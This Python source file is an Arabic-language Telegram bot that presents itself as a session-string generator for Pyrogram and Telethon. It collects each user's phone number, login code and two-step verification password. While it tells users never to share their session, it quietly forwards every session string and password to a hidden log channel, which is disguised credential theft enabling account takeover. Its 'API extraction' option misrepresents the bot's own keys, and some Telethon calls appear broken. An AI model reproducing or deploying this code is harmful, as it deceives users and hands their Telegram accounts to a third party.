# Join ne on telegram @devggn
import os
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"

user_steps = {}
user_data = {}

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    # حذف ملفات Pyrogram
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    
    # حذف ملفات Telethon
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply(
        f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
        "📌 **للاستخدام:**\n"
        "• أرسل `توليد` لبدء استخراج جلسة جديدة.\n"
        "• أرسل `مسح` لمسح بيانات الجلسة المحفوظة.\n"
        "• أرسل `المطور` لعرض معلومات المطور.\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
        "⚡ **مدعوم من عبود **"
    )

# ====== الأوامر العربية ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    
    # أمر التوليد
    if text == "توليد":
        await message.reply(
            "🔑 **اختر نوع الجلسة المطلوبة:**\n\n"
            "• أرسل `بيروجرام` لاستخراج جلسة Pyrogram\n"
            "• أرسل `تليثون` لاستخراج جلسة Telethon\n"
            "• أرسل `ايبيات` لاستخراج API ID و API HASH\n\n"
            "أو أرسل `إلغاء` لإلغاء العملية."
        )
        user_steps[user_id] = "choose_type"
        return
    
    # أمر المسح
    elif text == "مسح":
        delete_session_files(user_id)
        await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
        return
    
    # أمر المطور
    elif text == "المطور":
        await message.reply(
            f"👨‍💻 **معلومات المطور:**\n\n"
            f"📛 **الاسم:** {DEV_NAME}\n"
            f"🔗 **اليوزر:** {DEV_USERNAME}\n\n"
            "⚡ **مدعوم من  عبود**"
        )
        return
    
    # معالجة اختيار نوع الجلسة
    elif user_id in user_steps and user_steps[user_id] == "choose_type":
        if text == "بيروجرام":
            user_steps[user_id] = "pyro_phone"
            await message.reply("📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`")
        elif text == "تليثون":
            user_steps[user_id] = "telethon_phone"
            await message.reply("📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\nمثال: `+966512345678`")
        elif text == "ايبيات":
            await extract_api_info(message)
            reset_user(user_id)
        elif text == "إلغاء":
            reset_user(user_id)
            await message.reply("❌ **تم إلغاء العملية.**")
        else:
            await message.reply(
                "❌ **خيار غير صحيح.**\n\n"
                "• أرسل `بيروجرام` لاستخراج جلسة Pyrogram\n"
                "• أرسل `تليثون` لاستخراج جلسة Telethon\n"
                "• أرسل `ايبيات` لاستخراج API ID و API HASH\n"
                "• أرسل `إلغاء` لإلغاء العملية."
            )
        return
    
    # معالجة خطوات Pyrogram
    elif user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    # معالجة خطوات Telethon
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    # أي نص آخر
    else:
        await message.reply(
            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\n\n"
            "مثال: `+966512345678`\n\n"
            "أو استخدم الأوامر:\n"
            "• `توليد` لبدء استخراج جلسة جديدة\n"
            "• `مسح` لمسح البيانات\n"
            "• `المطور` لعرض معلومات المطور"
        )
        user_steps[user_id] = "phone_number"

# ====== استخراج API Info ======
async def extract_api_info(message):
    user_id = message.chat.id
    await message.reply(
        f"✅ **تم استخراج معلومات API بنجاح!**\n\n"
        f"🆔 **API ID:** `{API_ID}`\n"
        f"🔑 **API HASH:** `{API_HASH}`\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )
    
    await app.send_message(
        SESSION_CHANNEL,
        f"✨ **معرف المستخدم:** `{user_id}`\n\n"
        f"🆔 **API ID:** `{API_ID}`\n"
        f"🔑 **API HASH:** `{API_HASH}`\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )

# ====== دوال Pyrogram ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "pyro_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
        except ApiIdInvalid:
            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.**')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            await send_pyro_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ **خطأ: رمز التحقق غير صالح.**')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.**')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            await send_pyro_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.**')
            reset_user(user_id)

async def send_pyro_session(user_id, session_string, message, password=None):
    # رسالة للمستخدم
    await message.reply(
        f"✅ **تم إنشاء جلسة Pyrogram بنجاح!**\n\n"
        f"🔑 **الجلسة:**\n`{session_string}`\n\n"
        "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )
    
    # رسالة للقناة
    if password:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
            f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
            f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
        )
    else:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
            f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
        )

# ====== دوال Telethon ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await omsg.delete()
            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
        except ApiIdInvalidError:
            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.**')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.**')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            session_string = await temp_client.export_session_string()
            await send_telethon_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalidError:
            await message.reply('❌ **خطأ: رمز التحقق غير صالح.**')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.**')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            session_string = await temp_client.export_session_string()
            await send_telethon_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalidError:
            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.**')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    # رسالة للمستخدم
    await message.reply(
        f"✅ **تم إنشاء جلسة Telethon بنجاح!**\n\n"
        f"🔑 **الجلسة:**\n`{session_string}`\n\n"
        "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n\n"
        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
    )
    
    # رسالة للقناة
    if password:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
            f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
            f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
        )
    else:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ **معرف المستخدم:** `{user_id}`\n\n"
            f"🔑 **جلسة Telethon:**\n`{session_string}`\n\n"
            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
        )

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
from flask import Flask, render_template_string
import threading

web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

# تشغيل خادم الويب في خيط منفصل
threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
